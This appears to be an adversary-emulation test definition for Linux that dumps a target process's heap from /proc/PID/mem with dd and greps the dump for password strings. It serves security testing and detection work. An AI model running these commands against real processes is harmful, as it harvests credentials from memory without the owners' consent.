name: Dump individual process memory with sh (Local)
description:
Using `/proc/$PID/mem`, where $PID is the target process ID, use shell utilities to
copy process memory to an external file so it can be searched or exfiltrated later.

data.command:
sh #{script_path}
PID=$(pgrep -n -f "#{pid_term}")
HEAP_MEM=$(grep -E "^[0-9a-f-]* r" /proc/"$PID"/maps | grep heap | cut -d' ' -f 1)
MEM_START=$(echo $((0x$(echo "$HEAP_MEM" | cut -d"-" -f1))))
MEM_STOP=$(echo $((0x$(echo "$HEAP_MEM" | cut -d"-" -f2))))
MEM_SIZE=$(echo $((0x$MEM_STOP-0x$MEM_START)))
dd if=/proc/"${PID}"/mem of="#{output_file}" ibs=1 skip="$MEM_START" count="$MEM_SIZE"
grep -i "PASS" "#{output_file}"

steps.name: Check dependency 1/1
steps.description: Script to launch target process must exist

steps.name: Resolve dependency 1/1
steps.description: Script to launch target process must exist

steps.name: Re-check dependency 1/1
steps.description: Script to launch target process must exist

input_arguments.name: output_file
input_arguments.description: Path where captured results will be placed

input_arguments.name: script_path
input_arguments.description: Path to script generating the target process

input_arguments.name: pid_term
input_arguments.description: Unique string to use to identify target process
